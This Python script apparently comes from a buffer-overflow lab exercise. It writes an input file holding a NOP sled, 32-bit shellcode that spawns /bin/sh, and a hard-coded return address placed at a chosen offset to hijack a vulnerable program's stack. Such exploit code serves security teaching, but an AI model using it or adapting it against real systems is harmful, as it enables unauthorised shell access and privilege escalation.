    #!/usr/bin/python3

import sys
# TODO: Fill in the shellcode in between quotations
#Need to change
shellcode= (
    "\x31\xc0"             #/* xorl    %eax,%eax              */
    "\x50"                 #/* pushl   %eax                   */
    "\x68""//sh"           #/* pushl   $0x68732f2f            */
    "\x68""/bin"           #/* pushl   $0x6e69622f            */
    "\x89\xe3"             #/* movl    %esp,%ebx              */
    "\x50"                 #/* pushl   %eax                   */
    "\x53"                 #/* pushl   %ebx                   */
    "\x89\xe1"             #/* movl    %esp,%ecx              */
    "\x99"                 #/* cdq                            */
    "\xb0\x0b"             #/* movb    $0x0b,%al              */
    "\xcd\x80"             #/* int     $0x80                  */ 
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(527))

# TODO: put the shellcode somewhere in the payload
start = 400       #Need to change, This is the start position (index) of where the shellcode would go in the inputfile.
content[start:start + len(shellcode)] = shellcode


start = 400
#########################################################################
# TODO: Replace 0 with the correct offset value in decimal (this is where return-address must be written in inputfile
offset = 92     #Need to change


# TODO: Fill the return address field with the address of the shellcode
# Replace 0xFF with the correct value 
content[offset+0] = 0x24    #Need to change: fill in the 1st byte (least significant byte)
content[offset+1] = 0xD1    #Need to change: fill in the 2nd byte
content[offset+2] = 0xFF    #Need to change: fill in the 3rd byte
content[offset+3] = 0xFF    #Need to change: fill in the 4th byte (most significant byte)
#########################################################################

# Write the content to badfile
file = open("inputfile", "wb")
file.write(content)
file.close()
